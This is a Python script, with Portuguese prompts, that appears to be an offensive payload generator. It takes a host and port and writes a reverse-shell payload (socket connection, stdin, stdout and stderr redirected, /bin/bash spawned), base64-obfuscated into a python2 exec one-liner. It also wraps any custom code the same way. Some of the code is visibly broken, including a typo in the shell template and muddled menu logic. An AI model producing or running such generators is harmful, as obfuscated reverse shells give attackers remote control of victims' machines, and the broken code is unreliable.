import base64
import errno
import os

def payloads():
    def custon_payload():
        try:
            os.makedirs("/files/payloads/custon")
            print("[criando pasta Payloads][OK]")

        except OSError as exc:
            if exc.errno != errno.EEXIST:
                raise
            print("[pass]=[pasta payload existente]")
            pass
        print("[+]gera custon payload[+]")
        nome = input("[+]nome=>")
        prg = input("[+]extencao=>")
        print("[escreva o seu  custon payload]")
        full = nome + "." + prg
        code = input("""""")
        with open("payloads/custon/" + nome + "." + prg, "w") as pay:
            dsa = base64.b64encode(bytes(code, 'utf-8'))
            payload_base64 = (str(dsa)[2:-1])
            pay.write('python2 -c "exec(' + "'" + payload_base64 + "'.decode('base64'))" + '"')
            pay.close()
            if os.path.exists("/payloads/custon/%s" % full) == False:
                print("[+]payload gerado com sucesso[+]")
                print("[+]/payloads/custon/%s" % full)









    def python():
        try:
            os.makedirs("../../../payloads/")
            print("[criando pasta Payloads][OK]")

        except OSError as exc:
            if exc.errno != errno.EEXIST:
                raise
            print("[pass]=[pasta payload existente]")
            pass
        host = input("[+]host_payload=>")
        port = input("[+]port_payload=>")
        with open("../../../payloads/python_Base64.py", "w") as pay:
            payload = ("""
import socket, subprocess, os
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((%s,%s))
os.dup2(s.fileno(), 0)
os.dup2(s.fileno(), 1)
os.dup2(s.fileno(), 2)
p = subproce ss.call("/bin/bash")
            """ % (host, port))
            dsa = base64.b64encode(bytes(payload, 'utf-8'))
            payload_base64 = (str(dsa)[2:-1])
            pay.write('python2 -c "exec(' + "'" + payload_base64 + "'.decode('base64'))" + '"')
            pay.close()
            if os.path.exists("../../../payloads/python_Base64.py") == True:
                print("[ok]=>[payloads/payloads/python_Base64.py]")

    print("[+]que tipo de payload voce quer ?")
    print("[+]python=1")
    check = input("=>")
    if check == "1":
        python()

        if check == "1":
            with open("../../../payloads/python_Base64.py") as pay:
                check = input("[+]base64=1\n[+]decode=2\n=>")
                if check == "1":
                    for i in pay.readlines():
                        decode = base64.b64decode(i)
                        print(str(decode)[2:-1])
                else:
                    pass
        else:
            pass
    if check == "2":
        custon_payload()
